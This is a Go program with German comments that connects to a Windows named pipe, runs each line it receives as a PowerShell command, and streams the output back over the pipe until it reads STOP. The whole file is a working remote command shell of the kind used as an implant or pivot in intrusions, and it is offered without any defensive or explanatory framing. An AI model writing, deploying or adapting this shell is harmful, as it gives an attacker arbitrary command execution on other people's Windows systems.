package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	"github.com/natefinch/npipe"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Printf("Usage: %s \\\\.\\pipe\\yourpipename", os.Args[0])
		return
	}

	pipeName := os.Args[1]

	// Verbindung zur Named Pipe herstellen
	conn, err := npipe.Dial(pipeName)
	if err != nil {
		log.Fatalf("Fehler beim Verbinden mit der Pipe: %v", err)
	}
	defer conn.Close()

	fmt.Println("Mit Named Pipe verbunden.")
	conn.Write([]byte("Beenden der Verbindung mit STOP\n"))

	//	var cmd *exec.Cmd
	//	cmd = exec.Command("powershell")

	reader := bufio.NewReader(conn)
	for {
		conn.Write([]byte(">> "))
		input, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("Fehler beim Lesen des Inputs: %v", err)
			return
		}

		command := strings.TrimSpace(input)

		if command == "STOP" {
			os.Exit(0)
		}

		cmd := exec.Command("powershell", "-Command", command)

		//cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		if err := cmd.Run(); err != nil {
			log.Printf("Fehler beim Ausführen des Befehls: %v", err)
			conn.Write([]byte("Fehler beim Ausführen des Befehls.\n"))
			continue
		}
	}

}
